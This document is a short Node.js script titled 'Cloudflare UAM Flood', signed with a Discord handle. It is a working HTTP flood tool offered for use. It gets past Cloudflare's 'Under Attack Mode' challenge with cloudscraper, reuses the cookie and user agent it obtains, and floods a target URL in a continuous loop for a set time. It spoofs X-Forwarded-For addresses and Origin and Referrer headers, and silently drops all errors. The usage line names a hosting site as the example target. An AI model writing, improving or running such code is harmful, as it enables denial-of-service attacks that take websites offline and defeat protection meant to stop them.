/**
Cloudflare UAM Flood
Install module
Disccord: ???????? SkiZ?#2014
**/
var cloudscraper = require('cloudscraper');
var request=require('request');
var randomstring = require("randomstring");

var args = process.argv.slice(2);

randomByte = function() {
    return Math.round(Math.random()*256);
}

if (process.argv.length <= 2) {
    console.log("Usage: node CF-UAM.js https://https://www.kgb-hosting.com 60");
    process.exit(-1);
}
var url = process.argv[2];
var time = process.argv[3];

setInterval
var int = setInterval(() => {
    
    var cookie = '';
    var useragent = '';
    cloudscraper.get(url, function(error, response, body) {
        if (error) {
            console.log('Error occurred');
        } else {
            var parsed = JSON.parse(JSON.stringify(response));
            cookie = (parsed["request"]["headers"]["cookie"]);
            useragent = (parsed["request"]["headers"]["User-Agent"]);
        }
        // console.log(cookie + '/' + useragent)
        var rand = randomstring.generate({
            length: 12,
            charset: 'mareskizocbteam/2/2/2/2abcdefghijklmnopqstuvwxyz0123456789/ccl/ss'
          });
            var ip = randomByte() +'.' +
            randomByte() +'.' +
            randomByte() +'.' +
            randomByte();
            const options = {
            url: url,
            headers: {
                'User-Agent': useragent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'cookie': cookie,
                'Origin': 'http://' + rand + '.com',
                'Referrer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip
            }
            };

            function callback(error, response, body) {
            }
            request(options);
    });    
});
setTimeout(() => clearInterval(int), time * 1000);
process.on('uncaughtException', function(err) {
    
});

process.on('unhandledRejection', function(err) {
    
});